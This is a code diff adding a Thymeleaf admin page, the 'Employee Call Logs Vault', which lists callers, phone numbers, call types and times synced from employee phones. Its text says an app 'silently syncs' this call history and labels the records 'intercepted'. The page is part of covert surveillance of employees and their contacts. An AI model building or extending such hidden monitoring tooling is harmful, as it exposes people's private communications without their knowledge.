@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html xmlns:th="http://www.thymeleaf.org">
+
+<head>
+    <title>Employee Call Logs Vault</title>
+</head>
+
+<body>
+    <div th:replace="~{layout :: layout(~{::section}, ~{::script}, 'employee-call-logs-vault')}">
+        <section>
+            <div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
+                <h1 class="h2">Employee Call Logs Vault</h1>
+            </div>
+
+            <!-- Filter Form -->
+            <div class="card shadow-sm border-0 mb-4">
+                <div class="card-body">
+                    <form method="get" action="/admin/employee-call-logs-vault" class="row g-3 align-items-end">
+                        <div class="col-md-4">
+                            <label class="form-label text-muted small">Employee</label>
+                            <select name="employee" class="form-select form-select-sm">
+                                <option value="">All Employees</option>
+                                <option th:each="emp : ${employees}" th:value="${emp}" th:text="${emp}" th:selected="${emp == selectedEmployee}"></option>
+                            </select>
+                        </div>
+                        <div class="col-md-2 d-flex">
+                            <button type="submit" class="btn btn-sm btn-primary flex-grow-1 me-2"><i class="fas fa-filter"></i> Filter</button>
+                            <a href="/admin/employee-call-logs-vault" class="btn btn-sm btn-outline-secondary" title="Clear Filters"><i class="fas fa-undo"></i></a>
+                        </div>
+                    </form>
+                </div>
+            </div>
+
+            <!-- Aggregated Summary Stats -->
+            <div class="row mb-4">
+                <div class="col-md-4">
+                    <div class="card bg-primary text-white shadow-sm">
+                        <div class="card-body py-3">
+                            <div class="d-flex justify-content-between align-items-center">
+                                <div>
+                                    <h6 class="card-title mb-0 opacity-75">Total Intercepted Logs</h6>
+                                    <h2 class="mb-0" th:text="${#lists.size(logs)}">0</h2>
+                                </div>
+                                <i class="fas fa-phone-alt fa-2x opacity-50"></i>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-8">
+                    <div class="card bg-light shadow-sm h-100 border-0">
+                        <div class="card-body py-3 d-flex align-items-center">
+                            <i class="fas fa-info-circle text-primary fs-3 me-3"></i>
+                            <div>
+                                <h6 class="card-title mb-1">Active Call Log Monitoring</h6>
+                                <p class="mb-0 text-muted small">The Skylink app silently syncs call history from employee devices directly to this secure vault.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Table -->
+            <div class="card shadow-sm border-0">
+                <div class="card-body p-0">
+                    <div class="table-responsive">
+                        <table class="table table-hover align-middle mb-0">
+                            <thead class="table-light">
+                                <tr>
+                                    <th>Employee</th>
+                                    <th>Caller Name</th>
+                                    <th>Phone Number</th>
+                                    <th>Type</th>
+                                    <th>Duration</th>
+                                    <th>Time</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr th:if="${#lists.isEmpty(logs)}">
+                                    <td colspan="6" class="text-center py-4 text-muted">
+                                        <i class="fas fa-folder-open fa-2x mb-2 opacity-50"></i>
+                                        <p class="mb-0">No call logs found.</p>
+                                    </td>
+                                </tr>
+                                <tr th:each="log : ${logs}">
+                                    <td>
+                                        <span class="badge bg-primary rounded-pill" th:text="${log.employeeUsername}">Username</span>
+                                    </td>
+                                    <td th:text="${log.callerName ?: 'Unknown'}">Unknown</td>
+                                    <td th:text="${log.callNumber}">Phone Number</td>
+                                    <td>
+                                        <span class="badge" 
+                                              th:classappend="${log.callType == 'INCOMING' ? 'bg-success' : (log.callType == 'OUTGOING' ? 'bg-info' : 'bg-danger')}"
+                                              th:text="${log.callType}">INCOMING</span>
+                                    </td>
+                                    <td>
+                                        <span th:text="${log.durationSeconds + ' sec'}">0 sec</span>
+                                    </td>
+                                    <td th:text="${#temporals.format(log.callTimestamp, 'MMM dd, yyyy HH:mm:ss')}">Time</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
+        </section>
+        
+        <script>
+        </script>
+    </div>
+</body>
+
+</html>
